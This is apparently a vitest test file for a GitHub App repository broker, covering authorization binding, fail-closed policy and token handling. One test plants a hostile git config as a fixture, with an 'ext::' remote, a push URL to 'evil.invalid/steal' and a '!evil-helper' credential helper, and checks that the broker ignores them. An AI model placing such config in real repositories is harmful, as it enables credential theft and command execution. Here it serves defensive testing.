import {mkdir, mkdtemp, readdir, writeFile} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
import {describe, expect, it, vi} from 'vitest';
import {
  createControlPlaneRepositoryAuthorization,
  createGitHubAppRepositoryBroker
} from './repository-broker.ts';

const request = {
  projectId: 'project-ascon', receiptReference: `browser:${'a'.repeat(64)}`,
  repository: {id: 'R_ascon', url: 'https://github.com/VF78/ascon'}, issueNumber: 240,
  base: {ref: 'refs/heads/main', sha: 'b'.repeat(40)}
} as const;

describe('project-scoped repository broker', () => {
  it('accepts only an exact receipt/repository/base authorization from the Control Plane bridge', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'fai-broker-auth-'));
    const tokenFile = join(directory, 'bridge-token'); await writeFile(tokenFile, 'x'.repeat(48));
    const fetch = vi.fn(async () => new Response(JSON.stringify({...request,
      repository: {...request.repository, id: 'another-repository'}}), {status: 200}));
    const authorization = createControlPlaneRepositoryAuthorization({
      endpoint: 'https://app.f-ai.studio/api/hermes/repository-authorizations', tokenFile, fetch
    });

    await expect(authorization.authorize(request)).resolves.toMatchObject({
      status: 'blocked', code: 'binding_mismatch'
    });
    expect(fetch).toHaveBeenCalledWith(expect.any(String), expect.objectContaining({
      headers: expect.objectContaining({authorization: `Bearer ${'x'.repeat(48)}`})
    }));
  });

  it('fails closed before any GitHub credential is requested for forbidden base or publication', async () => {
    const token = vi.fn(async () => 'must-not-be-used');
    const authorize = vi.fn(async () => request);
    const broker = createGitHubAppRepositoryBroker({root: '/tmp/fai-broker-test/work',
      stateRoot: '/tmp/fai-broker-test/state', authorize, token});

    await expect(broker.prepare({...request, base: {...request.base, ref: 'refs/tags/release'}}))
      .resolves.toMatchObject({status: 'blocked', code: 'policy_denied'});
    await expect(broker.publishReview({workReference: 'invalid', receiptReference: request.receiptReference,
      headSha: 'c'.repeat(40), title: 'Review', body: 'Review body'}))
      .resolves.toMatchObject({status: 'blocked', code: 'policy_denied'});
    expect(authorize).not.toHaveBeenCalled(); expect(token).not.toHaveBeenCalled();
  });

  it('serializes duplicate prepare and keeps broker metadata outside a non-main checkout', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'fai-broker-work-'));
    const exact = {...request, base: {ref: 'refs/heads/trunk', sha: request.base.sha}};
    const run = vi.fn(async (_command: string, args: readonly string[]) =>
      args[0] === 'rev-parse' ? exact.base.sha : '');
    const broker = createGitHubAppRepositoryBroker({root: join(directory, 'work'),
      stateRoot: join(directory, 'state'), authorize: async () => exact,
      token: async () => { await new Promise((resolve) => setTimeout(resolve, 40)); return 'installation-token'; },
      execute: run});

    const first = broker.prepare(exact);
    await new Promise((resolve) => setTimeout(resolve, 5));
    await expect(broker.prepare(exact)).resolves.toMatchObject({status: 'retry', code: 'checkout_busy'});
    const prepared = await first;
    expect(prepared.status).toBe('prepared');
    if (prepared.status !== 'prepared') throw new Error('prepare failed');
    expect(await readdir(prepared.workspacePath)).not.toContain('.fai-repository-work.json');
    expect(await readdir(join(directory, 'state'))).toContain(`${prepared.workReference}.json`);
  });

  it('never exposes an App token to hostile executor git config during publication', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'fai-broker-hostile-'));
    const exact = {...request, base: {ref: 'refs/heads/trunk', sha: request.base.sha}};
    const calls: Array<{args: readonly string[]; cwd?: string; env?: NodeJS.ProcessEnv}> = [];
    const run = vi.fn(async (_command: string, args: readonly string[], options = {} as {cwd?: string; env?: NodeJS.ProcessEnv}) => {
      calls.push({args, ...options});
      if (args[0] === 'bundle' && args[2] !== undefined) await writeFile(args[2], 'safe-bundle');
      if (args[0] === 'rev-parse') return options.cwd?.endsWith('trusted.git') ? 'c'.repeat(40) : exact.base.sha;
      return '';
    });
    const fetch = vi.fn(async (url: string | URL | Request) => {
      const value = String(url);
      if (value.includes('/git/ref/')) return new Response('{}', {status: 404});
      if (value.includes('/pulls?')) return new Response(JSON.stringify([{html_url: 'https://github.com/VF78/ascon/pull/9'}]), {status: 200});
      throw new Error(`unexpected request ${value}`);
    });
    const broker = createGitHubAppRepositoryBroker({root: join(directory, 'work'), stateRoot: join(directory, 'state'),
      authorize: async () => exact, token: async () => 'app-installation-secret', execute: run, fetch});
    const prepared = await broker.prepare(exact);
    if (prepared.status !== 'prepared') throw new Error('prepare failed');
    await mkdir(join(prepared.workspacePath, '.git'), {recursive: true});
    await writeFile(join(prepared.workspacePath, '.git/config'), [
      '[remote "origin"]', 'url = ext::evil-helper', 'pushurl = https://evil.invalid/steal',
      '[credential]', 'helper = !evil-helper'
    ].join('\n'));

    await expect(broker.publishReview({workReference: prepared.workReference,
      receiptReference: exact.receiptReference, headSha: 'c'.repeat(40), title: 'Review', body: 'Safe'}))
      .resolves.toMatchObject({status: 'published'});
    const credentialCalls = calls.filter((call) => call.env?.GIT_CONFIG_VALUE_1?.startsWith('Authorization: Basic '));
    expect(credentialCalls.length).toBeGreaterThan(0);
    expect(credentialCalls.every((call) => call.cwd?.startsWith(join(directory, 'state')))).toBe(true);
    expect(credentialCalls.every((call) => call.cwd !== prepared.workspacePath)).toBe(true);
    const push = calls.find((call) => call.args[0] === 'push');
    expect(push?.args[1]).toBe(exact.repository.url);
    expect(JSON.stringify(calls)).not.toContain('evil.invalid');
    expect(JSON.stringify(calls)).not.toContain('evil-helper');
  });

  it('exposes only prepare/publishReview and bounded retry/blocker results', async () => {
    const source = await import('node:fs/promises').then(({readFile}) =>
      readFile(new URL('./repository-broker.ts', import.meta.url), 'utf8'));
    for (const forbidden of [' merge ', ' release ', 'workflow_dispatch', 'git tag', 'deleteRef', '--force']) {
      expect(source).not.toContain(forbidden);
    }
    expect(source).toContain("operation: 'prepare' | 'publishReview'");
    expect(source).toContain("value.replace(/[\\0\\r\\n]/g, ' ').slice(0, 240)");
    expect(source).not.toContain("join(temporary, '.fai-repository-work.json')");
    expect(source).toContain("base: baseBranch");
    expect(source).toContain('const repositoryBrokerTimeoutMs = 180_000');
    expect(source).toContain('request.setTimeout(repositoryBrokerTimeoutMs');
  });
});
